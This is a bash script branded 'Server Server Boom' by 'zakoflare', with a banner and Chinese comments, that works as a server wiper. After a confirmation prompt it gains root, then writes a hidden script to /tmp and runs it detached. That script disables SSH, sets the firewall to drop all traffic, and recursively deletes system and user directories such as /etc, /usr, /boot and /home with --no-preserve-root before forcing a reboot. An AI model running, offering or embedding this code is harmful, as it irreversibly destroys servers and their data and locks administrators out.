RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'

# 强制从终端读取   
echo -e "${GREEN}          _____                    _____                    _____           ${NC}"
echo -e "${GREEN}         /\    \                  /\    \                  /\    \          ${NC}"
echo -e "${GREEN}        /::\    \                /::\    \                /::\    \         ${NC}"
echo -e "${GREEN}       /::::\    \              /::::\    \              /::::\    \        ${NC}"
echo -e "${GREEN}      /::::::\    \            /::::::\    \            /::::::\    \       ${NC}"
echo -e "${GREEN}     /:::/\:::\    \          /:::/\:::\    \          /:::/\:::\    \      ${NC}"
echo -e "${GREEN}    /:::/__\:::\    \        /:::/__\:::\    \        /:::/__\:::\    \     ${NC}"
echo -e "${GREEN}    \:::\   \:::\    \       \:::\   \:::\    \      /::::\   \:::\    \    ${NC}"
echo -e "${GREEN}  ___\:::\   \:::\    \    ___\:::\   \:::\    \    /::::::\   \:::\    \   ${NC}"
echo -e "${GREEN} /\   \:::\   \:::\    \  /\   \:::\   \:::\    \  /:::/\:::\   \:::\ ___\  ${NC}"
echo -e "${GREEN}/::\   \:::\   \:::\____\/::\   \:::\   \:::\____\/:::/__\:::\   \:::|    | ${NC}"
echo -e "${GREEN}\:::\   \:::\   \::/    /\:::\   \:::\   \::/    /\:::\   \:::\  /:::|____| ${NC}"
echo -e "${GREEN} \:::\   \:::\   \/____/  \:::\   \:::\   \/____/  \:::\   \:::\/:::/    /  ${NC}"
echo -e "${GREEN}  \:::\   \:::\    \       \:::\   \:::\    \       \:::\   \::::::/    /   ${NC}"
echo -e "${GREEN}   \:::\   \:::\____\       \:::\   \:::\____\       \:::\   \::::/    /    ${NC}"
echo -e "${GREEN}    \:::\  /:::/    /        \:::\  /:::/    /        \:::\  /:::/    /     ${NC}"
echo -e "${GREEN}     \:::\/:::/    /          \:::\/:::/    /          \:::\/:::/    /      ${NC}"
echo -e "${GREEN}      \::::::/    /            \::::::/    /            \::::::/    /       ${NC}"
echo -e "${GREEN}       \::::/    /              \::::/    /              \::::/    /        ${NC}"
echo -e "${GREEN}       \::/    /                \::/    /                \::/____/          ${NC}"
echo -e "${GREEN}         \/____/                  \/____/                  ~~               By zakoflare${NC}"
echo -e "${GREEN}                                                                            SSB v4${NC}"
echo -e "${RED}============================================================================================================${NC}"
echo -e "${RED}               您正在运行「zakoflare 笑传之Server Server Boom」20260513A4LTS ${NC}"
echo -e "${RED}============================================================================================================${NC}"
read -p "请输入 'y' 确认或y以外的任意字母键取消: " confirm < /dev/tty
if [ "$confirm" != "y" ]; then
    echo "已取消"
    exit 0
fi

# 提权
if [ "$EUID" -ne 0 ]; then
    sudo -v || { echo "sudo 失败"; exit 1; }
    exec sudo bash "$0"
fi

# 破坏代码写入独立脚本
NUKER="/tmp/.self-destruct-$(date +%s).sh"
cat > "$NUKER" <<'EOF'
#!/bin/bash
exec &>/dev/null

# 关闭SSH
systemctl stop sshd 2>/dev/null || systemctl stop ssh 2>/dev/null
systemctl disable sshd 2>/dev/null || systemctl disable ssh 2>/dev/null

# 防火墙DROP
iptables -F 2>/dev/null; iptables -X 2>/dev/null
iptables -P INPUT DROP 2>/dev/null
iptables -P FORWARD DROP 2>/dev/null
iptables -P OUTPUT DROP 2>/dev/null

# 并行删除所有关键目录
for dir in /opt /www /srv /home /root /etc /var /usr /bin /lib /boot; do
    [ -d "$dir" ] && rm -rf --no-preserve-root "$dir" &
done
wait

# 触发立即重启
echo 1 > /proc/sys/kernel/sysrq 2>/dev/null
echo b > /proc/sysrq-trigger 2>/dev/null
reboot -f 2>/dev/null
EOF

chmod +x "$NUKER"

# 脱离会话
nohup "$NUKER" >/dev/null 2>&1 < /dev/null &
disown

# 掐断SSH
iptables -A OUTPUT -p tcp --sport 22 -j REJECT --reject-with tcp-reset 2>/dev/null
kill -9 $(ps -o ppid= -p $$) 2>/dev/null

exit 0